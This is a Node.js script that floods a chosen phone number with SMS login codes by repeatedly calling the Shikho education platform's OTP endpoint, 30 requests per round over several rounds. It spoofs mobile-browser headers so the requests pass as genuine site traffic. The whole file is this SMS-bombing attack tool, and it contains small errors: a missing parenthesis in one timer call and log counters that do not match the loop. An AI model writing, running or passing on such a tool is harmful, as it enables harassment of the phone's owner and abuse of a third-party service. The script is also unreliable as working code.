const axios = require("axios");

async function shikho(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 30; i++) {
      try {
        const response = await axios.post(
  'https://api.shikho.com/auth/v2/send/sms',
  {
    'phone': `88${number}`,
    'type': 'student',
    'auth_type': 'login',
    'vendor': 'shikho'
  },
  {
    headers: {
      'authority': 'api.shikho.com',
      'accept-language': 'en-US,en;q=0.9',
      'origin': 'https://shikho.com',
      'referer': 'https://shikho.com/',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    }
  }
);
        
        console.log(`[${i + 1}/10] Shikho Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] Shikho Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 120000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 1 hours before next round...`);
      await new Promise(resolve => setTimeout(resolve, 3600000);
    }
  }

  console.log("✅ All rounds completed.");
}

module.exports = { shikho };
